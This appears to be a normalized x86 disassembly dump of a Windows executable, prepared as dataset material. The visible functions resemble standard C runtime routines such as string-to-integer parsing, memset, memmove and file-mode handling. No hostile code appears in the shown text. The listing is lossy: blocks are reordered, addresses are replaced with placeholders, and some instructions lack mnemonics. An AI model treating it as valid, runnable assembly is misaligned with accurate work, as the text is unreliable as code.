imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_420377
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_419728
pop ecx
mov ebx eax
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_40d749
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_413d20
add esp 0xc
sub_42060d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_40f4fc
push eax
call sub_4119bd
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_40dd54
add eax 0x20
cmp esi eax
jne r-xdata
call sub_40dd54
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rwxdata ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rwxdata ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_413447
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_4206a9
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_40f52e
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_4206dd
push 0x10
push r--data
call sub_40e30c
call sub_40dd54
mov esi eax
add esi 0x20
mov [ ebp - 0x1c ] esi
xor eax eax
xor edi edi
cmp [ ebp + 0xc ] edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_40de2b
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_42060d
mov edi eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
push esi
push edi
call sub_4206a9
add esp 0x1c
mov [ ebp - 0x4 ] 0xfffffffe
call sub_420765
mov eax [ ebp - 0x20 ]
call sub_40d7cc
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_40e351
retn
sub_420818
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_40c8c3
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_4283ee
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_4208a2
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
cmp [ rwxdata ] 0x0
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rwxdata ]
movzx eax [ ecx + eax * 2 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420818
add esp 0xc
leave
retn
push [ rwxdata ]
lea eax [ ebp - 0x4 ]
push [ rwxdata ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push rwxdata
call sub_4283ee
add esp 0x1c
sub_420923
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_42097a
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_42097a
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_420923
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_420a09
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_40c8c3
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_40d7cc
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_42842c
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_40d7cc
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_420c38
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rwxdata ] eax
jne r-xdata
push eax
push rwxdata
jmp r-xdata
call sub_420a09
add esp 0x14
pop ebp
retn
sub_420c80
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
push 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push 0x0
push rwxdata
jmp r-xdata
call sub_420a09
add esp 0x14
pop ebp
retn
sub_420cc9
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_4117d6
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_40d7cc
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_4117d6
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_4117d6
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4117d6
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_420f88
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_40d7cc
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_4174f2
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_40d7cc
mov [ eax ] 0xd
call sub_40d7df
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_40d7df
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40eced
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_420f88
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_420e7f
push 0x10
push r--data
call sub_40e30c
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_40d7df
and [ eax ] 0x0
push 0x9
pop eax
jmp r-xdata
call sub_40d7df
mov [ eax ] edi
call sub_40d7cc
push 0x9
pop esi
mov [ eax ] esi
cmp eax [ rwxdata ]
jb r-xdata
call sub_40e351
retn
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rwxdata ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
cmp [ ebp + 0x10 ] edi
jg r-xdata
push eax
call sub_417569
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
jl r-xdata
call sub_40d7cc
push 0x9
pop esi
mov [ eax ] esi
mov [ ebp - 0x1c ] esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420cc9
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_40d7df
mov [ eax ] edi
call sub_40d7cc
push 0x16
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
cmp [ ebp + 0xc ] edi
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_420f62
mov eax [ ebp - 0x1c ]
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
mov eax esi
jmp r-xdata
sub_420f6c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cdq
push edx
push eax
push [ ebp + 0x8 ]
call sub_420e7f
add esp 0xc
neg eax
sbb eax eax
pop ebp
retn
sub_420f88
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rwxdata ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_421044
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x4000
je r-xdata
push eax
push rwxdata
call [ InterlockedExchange@IAT ]
xor eax eax
pop ebp
retn
cmp eax 0x8000
je r-xdata
cmp eax 0x10000
je r-xdata
call sub_40d7cc
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d749
add esp 0x14
push 0x16
pop eax
pop ebp
retn
sub_421090
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rwxdata ]
mov [ eax ] ecx
xor eax eax
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_4210c9
push 0x10
push r--data
call sub_40e30c
mov eax [ ebp + 0xc ]
cmp eax 0x4000
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0x8000
je r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_40d7cc
mov [ eax ] 0x9
jmp r-xdata
cmp eax 0x10000
je r-xdata
call sub_40d7cc
mov [ eax ] 0x9
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x40000
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rwxdata ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
call sub_40e351
retn
cmp eax 0x20000
je r-xdata
push eax
call sub_417569
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40d7cc
mov [ eax ] 0x16
xor ebx ebx
call sub_40d7cc
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420f88
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4211b6
mov eax [ ebp - 0x1c ]
sub_4211c0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_428523
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_428523
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_428670
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_4212b2
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rwxdata ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4211c0
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_428670
sub_42134e
mov eax [ rwxdata ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_42137b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_4213a0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_421428 ]
jmp [ ecx * 4 + jump_table_4214a8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_421514 ]
pop esi
pop edi
pop ebp
jmp sub_417a48
jmp [ ecx * 4 + jump_table_4216b0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4215b4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4216b0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_421514 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4216b0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_421514 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_421514 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_421514 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4216b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4216b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4216b0 ]
sub_42170b
mov edi edi
push ebp
mov ebp esp
